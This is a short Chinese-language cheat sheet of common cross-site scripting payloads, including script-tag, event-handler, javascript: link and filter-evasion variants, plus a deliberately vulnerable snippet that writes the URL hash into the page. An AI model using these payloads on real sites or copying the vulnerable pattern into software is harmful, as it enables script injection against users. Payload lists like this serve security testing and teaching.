# 常見 XSS Payload

1. 基本

``` javascript
<script>alert('XSS')</script>
```

2. Img onerror

``` html
<img src=x onerror=alert('xss') />
```

3. SVG onload

``` html
<svg onload=alert('xss')>
```

4. javascrippt 偽協議

``` html
<a href='javascript:alert("XSS")'>
```

5. window.location hash

``` html
http://example.com/index.html#<script>alert('XSS')</script>

<script>
  // 網頁直接將 hash 的內容寫入頁面
var content = window.location.hash.substring(1); 
document.write(decodeURIComponent(content));
</script>
```

6. HTML 實體編碼繞過 (HTML Entity Encoding)

``` html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

7. 大小寫混合

``` html
<ScRiPt>alert('XSS')</sCrIpT>
```

8. 空白過濾

``` html
<a/href="&#106;avascript:alert(1)">點我</a>
```

